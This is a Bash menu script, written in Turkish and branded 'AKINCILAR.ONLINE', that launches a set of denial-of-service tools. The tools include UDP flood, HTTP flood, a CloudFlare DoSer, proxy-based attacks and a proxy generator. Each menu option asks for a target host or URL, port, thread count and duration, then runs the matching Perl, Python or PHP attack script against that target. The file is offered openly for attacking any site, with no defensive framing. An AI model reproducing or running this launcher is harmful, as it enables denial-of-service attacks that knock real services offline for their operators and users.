#!/bin/bash
BLACK='\e[0;30m'
BLUE='\e[0;34m'
GREEN='\e[0;32m'
CYAN='\e[0;36m'
RED='\e[0;31m'
PURPLE='\e[0;35m'
BROWN='\e[0;33m'
LIGHTGRAY='\e[0;37m'
DARKGRAY='\e[1;30m'
LIGHTBLUE='\e[1;34m'
LIGHTGREEN='\e[1;32m'
LIGHTCYAN='\e[1;36m'
LIGHTRED='\e[1;31m'
LIGHTPURPLE='\e[1;35m'
YELLOW='\e[1;33m'
WHITE='\e[1;37m'
NC='\e[0m'              

exit_script()
{
  ./ddos.sh
}

udpflood()
{
    clear
chmod +x udp.pl
echo " "
echo -e "${LIGHTBLUE}       ▄         ▄  ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄ "
echo -e "${LIGHTBLUE}      ▐░▌       ▐░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌"
echo -e "${LIGHTBLUE}      ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌"
echo -e "${LIGHTBLUE}      ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌"
echo -e "${LIGHTBLUE}      ▐░▌       ▐░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌"
echo -e "${LIGHTBLUE}      ▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌"
echo -e "${LIGHTBLUE}      ▐░▌       ▐░▌▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀▀▀ "
echo -e "${LIGHTBLUE}      ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          "
echo -e "${LIGHTBLUE}      ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌          "
echo -e "${LIGHTBLUE}      ▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░▌          "
echo -e "${LIGHTBLUE}       ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀   ▀           "
echo " "
echo " Hedef Host/IP [ Orn : url.com/192.168.1.1 :  "
read host
echo " Port [80] :  "
read port
echo " Saniye :  "
read saniye
perl udp.pl $host $port $saniye
echo " Enter'a Basarak Devam Edebilirsiniz . . .  "
read enter
}

proxyattack()
{
    clear
chmod +x p.py
python p.py 
echo " Enter'a Basarak Devam Edebilirsiniz . . .  "
read enter
}

httfloodperl()
{
    clear
echo " "
echo -e "${YELLOW}        .S_sSSs      sSSs_sSSs      sSSs_sSSs    sdSS_SSSSSSbs  "
echo -e "${YELLOW}       .SS~YS%%b    d%%SP~YS%%b    d%%SP~YS%%b   YSSS~S%SSSSSP  "
echo -e "${YELLOW}       S%S    S%b  d%S       S%b  d%S       S%b       S%S       "
echo -e "${YELLOW}       S%S    S%S  S%S       S%S  S%S       S%S       S%S       "
echo -e "${YELLOW}       S%S    d*S  S&S       S&S  S&S       S&S       S&S       "
echo -e "${YELLOW}       S&S   .S*S  S&S       S&S  S&S       S&S       S&S       "
echo -e "${YELLOW}       S&S_sdSSS   S&S       S&S  S&S       S&S       S&S       "
echo -e "${YELLOW}       S&S~YSY%b   S&S       S&S  S&S       S&S       S&S       "
echo -e "${YELLOW}       S*S    S%b  S*b       d*S  S*b       d*S       S*S       "
echo -e "${YELLOW}       S*S    S%S  S*S.     .S*S  S*S.     .S*S       S*S       "
echo -e "${YELLOW}       S*S    S&S   SSSbs_sdSSS    SSSbs_sdSSS        S*S       "
echo -e "${YELLOW}       S*S    SSS    YSSP~YSSY      YSSP~YSSY         S*S       "
echo -e "${YELLOW}       SP                                             SP        "
echo -e "${YELLOW}       Y                                              Y         "
echo "                                                "
chmod +x r00t.pl
echo " Hedef URL [ Orn : http://url.com/ :  "
read host
perl r00t.pl $host
echo " Enter'a Basarak Devam Edebilirsiniz . . .  "
read enter

}

sahre()
{
    clear
echo -e "${YELLOW}          "
echo -e "${LIGHTGREEN}         ██████  ▄▄▄       ██░ ██  ██▀███  ▓█████ "
echo -e "${LIGHTGREEN}       ▒██    ▒ ▒████▄    ▓██░ ██▒▓██ ▒ ██▒▓█   ▀ "
echo -e "${LIGHTGREEN}       ░ ▓██▄   ▒██  ▀█▄  ▒██▀▀██░▓██ ░▄█ ▒▒███   "
echo -e "${LIGHTGREEN}         ▒   ██▒░██▄▄▄▄██ ░▓█ ░██ ▒██▀▀█▄  ▒▓█  ▄ "
echo -e "${LIGHTGREEN}       ▒██████▒▒ ▓█   ▓██▒░▓█▒░██▓░██▓ ▒██▒░▒████▒"
echo -e "${LIGHTGREEN}       ▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░ ▒ ░░▒░▒░ ▒▓ ░▒▓░░░ ▒░ ░"
echo -e "${LIGHTGREEN}       ░ ░▒  ░ ░  ▒   ▒▒ ░ ▒ ░▒░ ░  ░▒ ░ ▒░ ░ ░  ░"
echo -e "${LIGHTGREEN}       ░  ░  ░    ░   ▒    ░  ░░ ░  ░░   ░    ░   "
echo -e "${LIGHTGREEN}             ░        ░  ░ ░  ░  ░   ░        ░  ░"                                    
echo "                                                "
chmod +x sahre
echo " Hedef Host [ Orn : www.url.com ] :  "
read host
echo " Port [80] :  "
read port
echo " Thread [1000] :  "
read thread
./sahre $host $port $thread
echo " Enter'a Basarak Devam Edebilirsiniz . . .  "
read enter

}

cfdoser()
{
    clear
echo -e "${LIGHTGREEN}    "
echo -e "${LIGHTGREEN}      ..|'''.| '||''''|    '||''|.    ..|''||    .|'''.|  '||''''|  '||''|.   "   
echo -e "${LIGHTGREEN}    .|'     '   ||  .       ||   ||  .|'    ||   ||..  '   ||  .     ||   ||  "
echo -e "${LIGHTGREEN}    ||          ||''|       ||    || ||      ||   ''|||.   ||''|     ||''|'   "
echo -e "${LIGHTGREEN}    '|.      .  ||          ||    || '|.     || .     '||  ||        ||   |.  "
echo -e "${LIGHTGREEN}     ''|....'  .||.        .||...|'   ''|...|'  |'....|'  .||.....| .||.  '|' "
echo "                                                "
chmod +x cfdoser.php
echo " Hedef URL [ Orn : http://www.url.com ] :  "
read host
echo " Thread [1000] :  "
read thread
echo " Seconds [1000] :  "
read time
echo " Clients_Number [-1] :  "
read client
echo " Proxy List [list.txt] :  "
read proxy
php cfdoser.php $host $thread $time $client
echo " Enter'a Basarak Devam Edebilirsiniz . . .  "
read enter

}

powerfull()
{
    clear
echo -e "${LIGHTGREEN}    "
echo -e "${LIGHTCYAN}    ____    ___   __    __    ___  ____   _____  __ __  _      _       "
echo -e "${LIGHTCYAN}   |    \  /   \ |  T__T  T  /  _]|    \ |     ||  T  T| T    | T      "
echo -e "${LIGHTCYAN}   |  o  )Y     Y|  |  |  | /  [_ |  D  )|   __j|  |  || |    | |      "
echo -e "${LIGHTCYAN}   |   _/ |  O  ||  |  |  |Y    _]|    / |  l_  |  |  || l___ | l___   "
echo -e "${LIGHTCYAN}   v|  |   |     |l     '  !|   [_ |    \ |   _] |  :  ||     T|     T "
echo -e "${LIGHTCYAN}   |  |   l     ! \      / |     T|  .  Y|  T   l     ||     ||     |  "
echo -e "${LIGHTCYAN}   l__j    \___/   \_/\_/  l_____jl__j\_jl__j    \__,_jl_____jl_____j  "
echo "                                                "
chmod +x bty.pl
echo " Hedef URL [ Orn : http://www.url.com ] :  "
read host
echo " Connections [65000] :  "
read connections
echo " Socket [150] :  "
read socket
echo " Proxy List [list.txt] :  "
read proxy
perl bty.pl $host $connections $socket $proxy
echo " Enter'a Basarak Devam Edebilirsiniz . . .  "
read enter

}

proxygen()
{
    clear
echo -e "${YELLOW}          "
echo -e "${YELLOW}      ▄███████▄    ▄████████  ▄██████▄  ▀████    ▐████▀ ▄██   ▄   "
echo -e "${YELLOW}     ███    ███   ███    ███ ███    ███   ███▌   ████▀  ███   ██▄ "
echo -e "${YELLOW}     ███    ███   ███    ███ ███    ███    ███  ▐███    ███▄▄▄███ "
echo -e "${YELLOW}     ███    ███  ▄███▄▄▄▄██▀ ███    ███    ▀███▄███▀    ▀▀▀▀▀▀███ "
echo -e "${YELLOW}   ▀█████████▀  ▀▀███▀▀▀▀▀   ███    ███    ████▀██▄     ▄██   ███ "
echo -e "${YELLOW}     ███        ▀███████████ ███    ███   ▐███  ▀███    ███   ███ "
echo -e "${YELLOW}     ███          ███    ███ ███    ███  ▄███     ███▄  ███   ███ "
echo -e "${YELLOW}    ▄████▀        ███    ███  ▀██████▀  ████       ███▄  ▀█████▀  "
echo -e "${YELLOW}                  ███    ███                                      "                                 
echo "                                                "
chmod +x HiberProxy2.1.py
python3 HiberProxy2.1.py
echo " Enter'a Basarak Devam Edebilirsiniz . . .  "
read enter

}

cikis()
{
    clear
./aktool.sh
}

exit_script1()
{
  exit 1
}

Take_input1()
{
clear
while :
do
clear  
echo -e " "
echo -e "     "                 
echo -e "${RED}     ████████▄  ${WHITE}████████▄   ▄██████▄     ▄████████ "
echo -e "${RED}     ███   ▀███ ${WHITE}███   ▀███ ███    ███   ███    ███ "
echo -e "${RED}     ███    ███ ${WHITE}███    ███ ███    ███   ███    █▀  "
echo -e "${RED}     ███    ███ ${WHITE}███    ███ ███    ███   ███        "
echo -e "${RED}     ███    ███ ${WHITE}███    ███ ███    ███ ▀███████████ "
echo -e "${RED}     ███    ███ ${WHITE}███    ███ ███    ███          ███ "
echo -e "${RED}     ███   ▄███ ${WHITE}███   ▄███ ███    ███    ▄█    ███ "
echo -e "${RED}     ████████▀  ${WHITE}████████▀   ▀██████▀   ▄████████▀  "
echo -e "${WHITE}  "
    echo -e "${WHITE}    Created BY Murrez ${CYAN}AKINCILAR.ONLINE"
	echo " "
    echo -e "${LIGHTBLUE}   ==================== Script ==================== "	
    echo -e "${WHITE}   [1] ${WHITE}UDP Flood ${LIGHTRED}[Perl]"
    echo -e "${WHITE}   [2] ${WHITE}Proxy Attacker ${LIGHTRED}[Python]"	
	echo -e "${WHITE}   [3] ${WHITE}Http Flood ${LIGHTRED}[Perl]"	
	echo -e "${WHITE}   [4] ${WHITE}Http Flood - Request Tool ${LIGHTRED}"	
	echo -e "${WHITE}   [5] ${WHITE}CloudFlare DoSer ${LIGHTRED}[PHP]"		
	echo -e "${WHITE}   [6] ${WHITE}PowerFull Script ${LIGHTRED}[Perl]"		
	echo -e "${WHITE}   [7] ${WHITE}Proxy Generator Script ${LIGHTRED}[Python]"		
    echo -e "${LIGHTBLUE}   ================================================ "
	echo -e "${WHITE}   [99] ${WHITE}Menu'ye Geri Dön ${LIGHTRED}"		
    echo -n -e "${RED}root@MURREZ${WHITE}:${LIGHTBLUE}~/Desktop/aktool/DDOS${WHITE}# "
    read yourch
    case $yourch in
      1) udpflood ;;
      2) proxyattack ;;
      3) httfloodperl ;;
      4) sahre ;;
      5) cfdoser ;;
	  6) powerfull ;;
	  7) proxygen ;;
	  99) cikis ;;
      ex) echo "Okey !" ;  exit 1  ;;
      *) echo "HATALI RAKAM GIRDINIZ" ;
         echo "Enter Basarak Menuye Dönebilirsiniz . . ." ; read ;;
 esac
done # end_while
}
#
# Set trap to for CTRL+C interrupt i.e. Install our error handler
# When occurs it first it calls del_file() and then exit
#
trap exit_script 2
#
# Call our user define function : Take_input1
#
Take_input1